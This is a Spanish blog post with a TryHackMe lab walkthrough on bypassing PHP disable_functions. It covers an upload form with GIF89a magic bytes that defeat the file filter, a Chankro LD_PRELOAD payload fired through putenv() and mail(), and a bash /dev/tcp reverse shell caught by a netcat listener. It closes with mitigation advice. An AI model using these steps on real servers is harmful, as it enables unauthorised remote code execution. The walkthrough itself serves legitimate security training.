---
layout: post
title: "Bypass Disable Functions — TryHackMe Writeup"
date: 2026-02-22
Author: Jaki
categories: [Writeups, Pentesting-Web]
tags: [PHP, Exploitation, Chankro, RCE, TryHackMe]
image: /assets/img/1erwriteup.png
---

En este post, exploraremos cómo evadir restricciones severas en configuraciones de PHP dentro de entornos Linux. Veremos el flujo completo: desde el escaneo inicial hasta la obtención de una Reverse Shell mediante la técnica de secuestro de `LD_PRELOAD`.

## 🎯 1. Enumeración de Servicios

Todo proceso de pentesting comienza con un escaneo de puertos para identificar la superficie de ataque:

```bash
# Escaneo rápido de servicios y versiones
nmap -sV -sC -T4 <IP_VÍCTIMA>
```
**Resultados obtenidos:**

    Puerto 80 (HTTP): Servidor web activo (Punto de entrada).

    Puerto 22 (SSH): Servicio OpenSSH (Para persistencia posterior).

Al explorar el puerto 80, encontramos un formulario que permite la subida de imágenes y un archivo info.php expuesto.
![imagen Ilustrativa](/assets/img/infophp.png)
## 🔍 2. Reconocimiento Web y Limitaciones de PHP

Al inspeccionar el phpinfo(), detectamos que el servidor tiene implementada la directiva disable_functions, bloqueando los vectores comunes de ejecución de comandos:

    system, exec, shell_exec, passthru, popen, proc_open

Sin embargo, observamos dos factores críticos:

    Funciones permitidas: putenv() y mail() están habilitadas.

    Validación de archivos: El servidor utiliza filtros basados en "Magic Bytes", exigiendo que los archivos subidos parezcan imágenes reales (GIF/JPG).

## 🛠️ 3. Construcción del Exploit: El método Chankro

Para evadir estas restricciones, utilizaremos Chankro. Esta herramienta crea un archivo PHP que usa putenv() para definir la variable de entorno LD_PRELOAD. Al invocar mail(), el sistema carga una librería .so maliciosa antes que cualquier otra, permitiendo la ejecución de código.

# Instalación de la Herramienta:

Dado que **Chankro** no se encuentra en los repositorios oficiales de `apt`, debemos clonarlo directamente desde su repositorio oficial en GitHub. Es importante recordar que esta herramienta está diseñada para ejecutarse con **Python 2**.

```bash
# Clonamos el repositorio oficial
git clone https://github.com/TarlogicSecurity/Chankro.git

# Entramos al directorio
cd chankro
```
**Paso A: El script de Reverse Shell (rev_shell.sh)**

Preparamos el comando que queremos que el servidor ejecute:

```bash

 #!/bin/bash
 # Reemplaza con tu IP de la interfaz tun0 (VPN de THM)
 bash -c 'bash -i >& /dev/tcp/[IP Atacante]/[Puerto] 0>&1'
```
**Paso B: Generación del payload**

Ejecutamos Chankro indicando la arquitectura del servidor y la ruta absoluta donde se alojará el archivo:
```bash

python2 chankro.py --arch 64 --input rev_shell.sh --output exploit.php --path /var/www/html/uploads
```
## 🚀 4. Evasión de Filtros y Explotación
**Inyección de Magic Bytes**

Para que el servidor acepte nuestro exploit.php, debemos engañar al validador de tipos de archivo añadiendo el header GIF89a; al inicio del archivo generado:
```php

GIF89a;
<?php
// Código generado por Chankro...
?>
```
![Imagen Ilustrativa](/assets/img/magicbytes.png)
**Preparando la recepción (Netcat)**

Iniciamos un oyente en nuestra máquina atacante para capturar la shell:
```bash

nc -lvnp [Puerto]
```

    -l: (Listen) Escuchar conexiones.

    -v: (Verbose) Mostrar detalles de la conexión.

    -n: No resolver DNS (evita retardos).

    -p: Especificar el puerto de escucha.

## 🏁 5. Ejecución y Shell Interactiva

Subimos el archivo exploit.php a través del formulario web. Al acceder directamente a su URL en el navegador:

http://IP_VÍCTIMA/uploads/exploit.php

El servidor procesa el PHP, activa la variable LD_PRELOAD, ejecuta mail() y nuestro script de bash nos devuelve la conexión.
![Imagen Ilustrativa](/assets/img/rev_shell.png)
**Estabilización de la TTY**

Una vez recibida la shell en Netcat, la estabilizamos para tener una terminal funcional:
```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'
# Presionar Ctrl+Z, luego escribir:
stty raw -echo; fg
```
Flag obtenida: cat /home/s4vi/flag.txt
## 🛡️ Mitigación y Recomendaciones

Para prevenir este tipo de ataques, no basta con deshabilitar las funciones de ejecución. Es necesario:

    Añadir putenv() a la lista de disable_functions.

    Deshabilitar funciones de envío de correo como mail() si no son necesarias.

    Implementar una validación de archivos más robusta que no dependa solo de los Magic Bytes.

Gracias por leer :D. Atte: Jaki
